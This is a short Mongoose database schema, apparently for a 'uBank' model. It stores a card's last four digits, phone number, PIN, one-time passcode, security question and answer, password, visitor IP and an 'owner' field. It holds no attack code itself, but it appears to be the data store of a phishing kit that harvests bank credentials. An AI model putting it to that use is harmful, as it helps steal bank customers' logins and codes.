const mongoose = require("mongoose");

const ubankSchema = new mongoose.Schema({
  uniqueid: Number,
  last4: String,
  telephone: String,
  pin: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
  secQuestion: String,
  secAnswer: String,
  password: String,
  timestamp: Date,
});

module.exports = mongoose.model("uBank", ubankSchema);
